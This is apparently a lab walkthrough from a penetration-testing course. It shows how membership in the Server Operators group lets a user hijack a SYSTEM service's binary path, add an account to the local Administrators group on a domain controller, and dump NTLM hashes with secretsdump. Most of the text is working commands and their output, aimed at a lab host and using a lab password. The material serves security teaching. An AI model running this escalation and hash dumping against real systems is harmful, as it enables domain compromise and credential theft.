The [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) group allows members to administer Windows servers without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.

Membership of this group confers the powerful `SeBackupPrivilege` and `SeRestorePrivilege` privileges and the ability to control local services.

#### Querying the AppReadiness Service

Let's examine the `AppReadiness` service. We can confirm that this service starts as SYSTEM using the `sc.exe` utility.

```cmd-session
C:\htb> sc qc AppReadiness

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AppReadiness
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : App Readiness
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

#### Checking Service Permissions with PsService

We can use the service viewer/controller [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice), which is part of the Sysinternals suite, to check permissions on the service. `PsService` works much like the `sc` utility and can display service status and configurations and also allow you to start, stop, pause, resume, and restart services both locally and on remote hosts.
```cmd-session
C:\htb> c:\Tools\PsService.exe security AppReadiness

SERVICE_NAME: AppReadiness
DISPLAY_NAME: App Readiness
        ACCOUNT: LocalSystem
        SECURITY:
        [ALLOW] NT AUTHORITY\SYSTEM
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                Pause/Resume
                Start
                Stop
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Administrators
                All
        [ALLOW] NT AUTHORITY\INTERACTIVE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] NT AUTHORITY\SERVICE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Server Operators
                All
```
This confirms that the Server Operators group has [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) access right, which gives us full control over this service.

#### Checking Local Admin Group Membership

Let's take a look at the current members of the local administrators group and confirm that our target account is not present.
```cmd-session
C:\htb> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
The command completed successfully.
```


#### Modifying the Service Binary Path

Let's change the binary path to execute a command which adds our current user to the default local administrators group.

```cmd-session
C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

[SC] ChangeServiceConfig SUCCESS
```

#### Starting the Service

Starting the service fails, which is expected.
```cmd-session
C:\htb> sc start AppReadiness

[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```


#### Confirming Local Admin Group Membership

If we check the membership of the administrators group, we see that the command was executed successfully.
```cmd-session
C:\htb> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
server_adm
The command completed successfully.
```

#### Confirming Local Admin Access on Domain Controller

From here, we have full control over the Domain Controller and could retrieve all credentials from the NTDS database and access other systems, and perform post-exploitation tasks.
```bash
crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
```

#### Retrieving NTLM Password Hashes from the Domain Controller
```bash
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```
